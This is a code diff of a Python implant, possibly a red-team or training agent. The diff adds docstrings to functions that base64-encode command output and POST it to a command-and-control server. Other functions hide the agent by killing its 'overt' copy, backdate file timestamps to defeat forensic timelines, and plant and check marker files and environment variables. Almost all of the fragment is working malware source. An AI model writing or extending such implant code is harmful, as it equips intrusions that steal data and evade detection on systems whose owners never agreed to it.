@@ -64,6 +64,14 @@ def check_active():
     return False
 
 def send_data(data):
+    """Make POST request to C2 server with command data
+
+    Args:
+        data (string): Result of command
+
+    Returns:
+        int: Status code from C2 server
+    """
     data = base64.urlsafe_b64encode(bytes(data.encode('utf-8')))
     r = requests.post(f"http://0.0.0.0:{PORT}/data", data = data)
     return r.status_code
@@ -169,17 +177,26 @@ def become_silent():
         print("Killing overt agent...")
         exit(0)
     if cmdline == hidden:
-        pass
+        print("Agent is covert!")
     else:
+        print("Already present, killing...")
         leave_mark()
         # Should die if already on system
         exit(0)
 
 def randomize_timestamp(file):
+    """Generate random timestamp for files created
+    Between a year and 6 months ago
+
+    Args:
+        file (string): filename of file to change
+    """
     set_stamp = time.time() - random.randrange(15778463 ,31556926)
     os.utime(file, (set_stamp, set_stamp))
 
 def leave_mark():
+    """Generate IOCs on machine, to leave presence clear
+    """
     #TODO add more names, randomize
     f = open(f"{str(pathlib.Path.home())}/.zshconf", "w")
     f.close()
@@ -187,6 +204,11 @@ def leave_mark():
     os.environ["BASH"] = "1"
 
 def check_mark():
+    """Check if IOCs present on system
+
+    Returns:
+        bool: True if present
+    """
     if os.path.isfile(f"{str(pathlib.Path.home())}/.zshconf"):
         return True
     if os.environ.get("BASH") == "1":
